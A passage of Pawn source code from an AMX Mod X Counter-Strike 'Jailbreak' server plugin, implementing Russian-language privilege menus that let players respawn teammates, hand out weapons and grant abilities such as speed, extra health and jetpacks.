		case 1:
		{
			for(new i = 1; i <= g_iMaxPlayers; i++)
			{
				if(IsSetBit(g_iBitUserConnected, i) && g_iUserTeam[i] == 1 && IsNotSetBit(g_iBitUserAlive, i))
				{
					ExecuteHamB(Ham_CS_RoundRespawn, i);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ELITE_RESPAWN_TT", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
		}
		case 2:
		{
			for(new i = 1; i <= g_iMaxPlayers; i++)
			{
				if(IsSetBit(g_iBitUserConnected, i) && IsNotSetBit(g_iBitUserAlive, i) && (g_iUserTeam[i] == 1 || g_iUserTeam[i] == 2))
				{
					ExecuteHamB(Ham_CS_RoundRespawn, i);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ELITE_RESPAWN_ALL", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
		}
		case 3: return Show_EliteResPl(id, g_iMenuPosition[id] = 0);
		case 8: return Show_EliteMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_EliteRespawn(id);
}

Show_EliteResPl(id, iPos)
{
	if(iPos < 0) return PLUGIN_HANDLED;
	new iPlayersNum;
	for(new i = 1; i <= MAX_PLAYERS; i++)
	{
		if(IsNotSetBit(g_iBitUserConnected, i) || IsSetBit(g_iBitUserAlive, i) || (g_iUserTeam[i] != 1 && g_iUserTeam[i] != 2)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % PLAYERS_PER_PAGE);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", id, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_EliteMenu(id);
		}
		default: iLen = formatex( szMenu, charsmax( szMenu ), "\wКого возродим? [%d/%d]^n^n", iPos + 1, iPagesNum);
	}
	new szName[MAX_PLAYERS], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum) 
	{
		iKeys |= ( 1<<8 );
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \wДалее^n\r[0] \w%s", iPos ? "Назад" : "Выход" );
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%s", iPos ? "Назад" : "Выход" );
	return show_menu(id, iKeys, szMenu, -1, "Show_EliteResPl");
}

public Handle_EliteResPl(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_EliteResPl(id, ++g_iMenuPosition[id]);
		case 9: return Show_EliteResPl(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			new szName[32], szName2[32];
			get_user_name(iTarget, szName, charsmax(szName));
			get_user_name(id, szName2, charsmax(szName2));
			ExecuteHamB(Ham_CS_RoundRespawn, iTarget);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ELITE_RESPAWN_PLAYER", szName2, szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
		}
	}
	return Show_EliteResPl(id, g_iMenuPosition[id]);
}

Show_SuperSimonMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<0|1<<5|1<<6|1<<7|1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SUPER_SIMON_TITLE");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SUPER_SIMON_ORJ");
	if(iAlive && g_iSuperSimonData[id][GIVEKT] >= g_iAllCvars[SUPER_SIMON_GIVEKT_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L \w[\d1\w]^n", id, "JBE_MENU_SUPER_SIMON_KT_GIVE");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_KT_GIVE", g_iAllCvars[SUPER_SIMON_GIVEKT_ROUND]);
	if(iAlive && g_iSuperSimonData[id][GIVETT] >= g_iAllCvars[SUPER_SIMON_GIVETT_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L \w[\d1\w]^n", id, "JBE_MENU_SUPER_SIMON_TT_GIVE");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_TT_GIVE", g_iAllCvars[SUPER_SIMON_GIVETT_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][GIVEKTT] >= g_iAllCvars[SUPER_SIMON_GIVEKTT_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L \w[\d1\w]^n", id, "JBE_MENU_SUPER_SIMON_KT_GIVE_M3");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_KT_GIVE_M3", g_iAllCvars[SUPER_SIMON_GIVEKTT_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][GIVETTT] >= g_iAllCvars[SUPER_SIMON_GIVETTT_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L \w[\d1\w]^n", id, "JBE_MENU_SUPER_SIMON_TT_GIVE_M3");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_TT_GIVE_M3", g_iAllCvars[SUPER_SIMON_GIVETTT_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_SUPER_SIMON_MUSIC");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_SUPER_SIMON_BUILD");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_SUPER_SIMON_SPLIF");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SuperSimonMenu");
}

public Handle_SuperSimonMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
        case 0:
        {
            {
                new iTarget, iBody;
                get_user_aiming(id, iTarget, iBody, 60);
                if(jbe_is_user_valid(iTarget) && IsSetBit(g_iBitUserAlive, iTarget))
                {
                        new iBitWeapons = pev(iTarget, pev_weapons);
                        if(iBitWeapons &= ~(1<<CSW_HEGRENADE|1<<CSW_SMOKEGRENADE|1<<CSW_FLASHBANG|1<<CSW_KNIFE|1<<31))
                            {
                            fm_strip_user_weapons(iTarget);
                            fm_give_item(iTarget, "weapon_knife");
                            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_ORJ");
                            }
                        else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_ORJ_NO");
                }
                else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_OGR");
            }
        }
		case 1:
        {
                for(new i = 1; i < g_iMaxPlayers; i++)
                {
                if(is_user_alive(i) && jbe_get_user_team(i) == 2 && is_user_connected(i))
                    {
                    fm_give_item(i, "weapon_ak47");
                    fm_set_user_bpammo(i, CSW_AK47, 200);
                    }
                }
                new szName[32];
                get_user_name(id, szName, charsmax(szName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_KT_GIVE", szName);
				g_iSuperSimonData[id][GIVEKT] = 0;
        }
        case 2:
        {
                for(new i = 1; i < g_iMaxPlayers; i++)
                {
                if(is_user_alive(i) && jbe_get_user_team(i) == 1 && is_user_connected(i) && IsNotSetBit(g_iBitUserFree, i) && IsNotSetBit(g_iBitUserWanted, i))
                    {
                    fm_give_item(i, "weapon_ak47");
                    fm_set_user_bpammo(i, CSW_AK47, 200);
                    }
                }
                new szName[32];
                get_user_name(id, szName, charsmax(szName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_TT_GIVE", szName);
				g_iSuperSimonData[id][GIVETT] = 0;
        }
		case 3:
        {
                for(new i = 1; i < g_iMaxPlayers; i++)
                {
                if(is_user_alive(i) && jbe_get_user_team(i) == 2 && is_user_connected(i))
                    {
                    fm_give_item(i, "weapon_m3");
                    fm_set_user_bpammo(i, CSW_M3, 200);
                    }
                }
                new szName[32];
                get_user_name(id, szName, charsmax(szName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_KT_GIVE_M3", szName);
				g_iSuperSimonData[id][GIVEKTT] = 0;
        }
        case 4:
        {
                for(new i = 1; i < g_iMaxPlayers; i++)
                {
                if(is_user_alive(i) && jbe_get_user_team(i) == 1 && is_user_connected(i) && IsNotSetBit(g_iBitUserFree, i) && IsNotSetBit(g_iBitUserWanted, i))
                    {
                    fm_give_item(i, "weapon_m3");
                    fm_set_user_bpammo(i, CSW_M3, 200);
                    }
                }
                new szName[32];
                get_user_name(id, szName, charsmax(szName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_TT_GIVE_M3", szName);
				g_iSuperSimonData[id][GIVETTT] = 0;
        }
		case 5: return Cmd_SMusicMenu(id);
		case 6: return Cmd_BuildMenu(id);
		case 7: return Show_SpleefMenu(id);
		case 8: return Show_SimonSuperMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_SuperSimonMenu(id);
}

public jbe_daymode_start_game()
{
	jbe_vote_day_mode_start();
	jbe_set_day_mode(3);
}

Show_SimonSuperMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<7|1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SUPER_SIMONES_TITLE");
	
	if(iAlive && g_iSuperSimonData[id][RES] >= g_iAllCvars[SUPER_SIMON_RES_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L \w[\d1\w]^n", id, "JBE_MENU_SUPER_SIMON_RES");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_RES", g_iAllCvars[SUPER_SIMON_RES_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][GLUSH] >= g_iAllCvars[SUPER_SIMON_GLUSH_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SUPER_SIMON_GLUSH");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_GLUSH", g_iAllCvars[SUPER_SIMON_GLUSH_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][INVIZ] >= g_iAllCvars[SUPER_SIMON_INVIZ_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SUPER_SIMON_INVIZ");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_INVIZ", g_iAllCvars[SUPER_SIMON_INVIZ_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][SPEED] >= g_iAllCvars[SUPER_SIMON_SPEED_ROUND])
	{
		if(IsNotSetBit(g_iBitFastRun, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_SUPER_SIMON_SPEED");
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_SUPER_SIMON_SPEED");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_SPEED", g_iAllCvars[SUPER_SIMON_SPEED_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][HP] >= g_iAllCvars[SUPER_SIMON_HP_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_SUPER_SIMON_HP");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_HP", g_iAllCvars[SUPER_SIMON_HP_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][JUMP] >= g_iAllCvars[SUPER_SIMON_JUMP_ROUND])
	{
		if(IsNotSetBit(g_iBitDoubleJump, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_SUPER_SIMON_JUMP");
			iKeys |= (1<<5);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_SUPER_SIMON_JUMP");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_JUMP", g_iAllCvars[SUPER_SIMON_JUMP_ROUND]);
	
	if(iAlive && g_iSuperSimonData[id][BHOP] >= g_iAllCvars[SUPER_SIMON_BHOP_ROUND])
	{
		if(IsNotSetBit(g_iBitAutoBhop, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_SUPER_SIMON_BHOP");
			iKeys |= (1<<6);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_SUPER_SIMON_BHOP");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_SUPER_SIMON_BHOP", g_iAllCvars[SUPER_SIMON_BHOP_ROUND]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L %s^n", id, "JBE_MENU_SUPER_SIMON_GUARD_OFF", i_DataSpecialChief[GUARD_VOICE] ? "\yВкл" : "\rВыкл");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_NEXT");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SimonSuperMenu");
}

public Handle_SimonSuperMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
	    case 0:
        {
            {
                if((g_iAlivePlayersNum[1] >= 3))
                {
                    for(new i = 1; i <= g_iMaxPlayers; i++)
                    {
                        if(is_user_connected(i))
                        {
                            if(!is_user_alive(i) && (jbe_get_user_team(i) == 2))
                            {
                            ExecuteHam(Ham_CS_RoundRespawn, i);
                            }
                        }
                    }
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_KT_RES", szName);
					UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
                    g_iSuperSimonData[id][RES] = 0;
                }
                else
                {
				    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_KT_RES_NO", szName);
                }
            }
        }
		case 1:
        {
            {
                for(new i = 1; i < g_iMaxPlayers; i++)
                {
                    if(is_user_alive(i) && jbe_get_user_team(i) == 1 && is_user_connected(i) && IsNotSetBit(g_iBitUserFree, i))
                    {
                       set_pev(i, pev_punchangle, {400.0, 999.0, 400.0});
                       UTIL_ScreenFade(i, (1<<13), (1<<13), 0, 255, 165, 255, 155);
                    }
                }
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_GLUSH", szName);
				emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
                g_iSuperSimonData[id][GLUSH] = 0;
            }
        }
		case 2:
		{
			jbe_set_user_rendering(id, kRenderFxGlowShell, 0, 0, 0, kRenderTransAlpha, 70);
			g_iSuperSimonData[id][INVIZ] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_INVIZ", szName);
		}
		case 3:
		{
			SetBit(g_iBitFastRun, id);
			ExecuteHamB(Ham_Player_ResetMaxSpeed, id);
			g_iSuperSimonData[id][SPEED] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_SPEED", szName);
		}
		case 4:
        {
            set_pev(id, pev_health, 500.0);
            g_iSuperSimonData[id][HP] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_HP", szName);
        }
		case 5:
		{		
			SetBit(g_iBitDoubleJump, id);
			g_iSuperSimonData[id][JUMP] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_JUMP", szName);			
		}
		case 6:
		{
			SetBit(g_iBitAutoBhop, id);
			g_iSuperSimonData[id][BHOP] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_BHOP", szName);
		}
		case 7: 
		{
			i_DataSpecialChief[GUARD_VOICE] = i_DataSpecialChief[GUARD_VOICE] ? false : true;
		    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_SUPER_SIMON_GUARD_OFF", i_DataSpecialChief[GUARD_VOICE] ? "[РАЗРЕШИЛ]" : "[ЗАПРЕТИЛ]");
		}
		case 8: return Show_SuperSimonMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_SimonSuperMenu(id);
}

Show_DemonMenu_1(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	
	new szMenu[1024], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_DEMON_TITLE");
	
	if(!iAlive && g_iDemonData[id][RES_DEMON] >= g_iAllCvars[DEMON_RS_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n\d> Даже при бунте.^n^n", id, "JBE_MENU_DEMON_RES");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n\d> Даже при бунте.^n^n", id, "JBE_MENU_DEMON_RES", g_iAllCvars[DEMON_RS_ROUND]);
	
	if(iAlive && g_iDemonData[id][JETPACK_DEMON] >= g_iAllCvars[DEMON_JETPACK_ROUND])
	{
		if(g_iUserTeam[id] == 2)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_DEMON_JETPACK");
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L^n", id, "JBE_MENU_DEMON_JETPACK");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DEMON_JETPACK", g_iAllCvars[DEMON_JETPACK_ROUND]);
	
	if(iAlive && g_iDemonData[id][MEGAJUMP_DEMON] >= g_iAllCvars[DEMON_JUMP_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_DEMON_JUMP");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DEMON_JUMP", g_iAllCvars[DEMON_JUMP_ROUND]);
	
	if(iAlive && g_iDemonData[id][PUMPKIN_DEMON] >= g_iAllCvars[DEMON_PUMPKIN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_DEMON_PUMPKIN");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DEMON_PUMPKIN", g_iAllCvars[DEMON_PUMPKIN_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_DemonMenu_1");
}

public Handle_DemonMenu_1(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
        case 0:
        {
            ExecuteHamB(Ham_CS_RoundRespawn, id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_RES", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
			g_iDemonData[id][RES_DEMON] = 0;
        }
		case 1:
        {
            give_jet_pack(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_JETPACK", szName);
			g_iDemonData[id][JETPACK_DEMON] = 0;
        }
		case 2:
        {
            jbe_user_long(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_JUMP", szName);
			g_iDemonData[id][MEGAJUMP_DEMON] = 0;
        }
		case 3:
        {
            give_weapon_pumkin(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_PUMPKIN", szName);
			g_iDemonData[id][PUMPKIN_DEMON] = 0;
        }
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_DemonMenu_1(id);
}

Show_DemonMenu_2(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	
	new szMenu[1024], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_DEMON_TITLE");
	
	if(!iAlive && g_iDemonData[id][RES_DEMON] >= g_iAllCvars[DEMON_RS_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n\d> Даже при бунте.^n^n", id, "JBE_MENU_DEMON_RES");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n\d> Даже при бунте.^n^n", id, "JBE_MENU_DEMON_RES", g_iAllCvars[DEMON_RS_ROUND]);
	
	if(iAlive && g_iDemonData[id][JETPACK_DEMON] >= g_iAllCvars[DEMON_JETPACK_ROUND])
	{
		if(g_iUserTeam[id] == 2)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_DEMON_JETPACK");
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \r[Охрана]^n", id, "JBE_MENU_DEMON_JETPACK");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DEMON_JETPACK", g_iAllCvars[DEMON_JETPACK_ROUND]);
	
	if(iAlive && g_iDemonData[id][GRENADE_DEMON] >= g_iAllCvars[DEMON_GRANADE_ROUND])
	{
		if(g_iUserTeam[id] == 2)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_DEMON_GRENADE");
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \r[Охрана]^n", id, "JBE_MENU_DEMON_GRENADE");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DEMON_GRENADE", g_iAllCvars[DEMON_GRANADE_ROUND]);
	
	if(iAlive && id == g_iChiefId)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_DEMON_MARKER");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r[Начальник]^n", id, "JBE_MENU_DEMON_MARKER", g_iAllCvars[DEMON_PUMPKIN_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_DemonMenu_2");
}

public Handle_DemonMenu_2(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
        case 0:
        {
            ExecuteHamB(Ham_CS_RoundRespawn, id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_RES", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
			g_iDemonData[id][RES_DEMON] = 0;
        }
		case 1:
        {
            give_jet_pack(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_JETPACK", szName);
			g_iDemonData[id][JETPACK_DEMON] = 0;
        }
		case 2:
        {
            give_weapon_shield(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DEMON_GRENADE", szName);
			g_iDemonData[id][GRENADE_DEMON] = 0;
        }
